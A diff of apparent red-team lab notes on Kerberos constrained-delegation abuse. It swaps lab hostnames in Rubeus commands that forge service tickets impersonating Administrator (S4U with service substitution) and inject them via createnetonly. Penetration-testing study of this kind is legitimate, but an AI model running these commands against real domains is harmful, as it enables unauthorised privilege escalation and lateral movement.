@@ -36,7 +36,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 
 1.  Perform the S4U abuse to obtain a usable service ticket using service name substitution
 
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1.contoso.com /altservice:cifs /impersonateuser:Administrator /nowrap /ticket:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:DUB-WEB-1$ /msdsspn:MSSQLSvc/dub-sql-1.dublin.contoso.com /altservice:cifs /impersonateuser:Administrator /nowrap /ticket:
 ```
 
 > Use the FQDN for the services to avoid oopsies
@@ -44,14 +44,14 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-
 2. Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value,
 
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1.contoso.com /impersonateuser:Administrator /nowrap /ticket:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:MSSQLSvc/dub-sql-1.dublin.contoso.com /impersonateuser:Administrator /nowrap /ticket:
 ```
 
 ---
 
  Inject the ticket into a sacrificial logon session.
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DUBLIN.CONTOSO.COM /username:Administrator /password:FakePass /ticket:
 ```
 
  Impersonate the process and verify
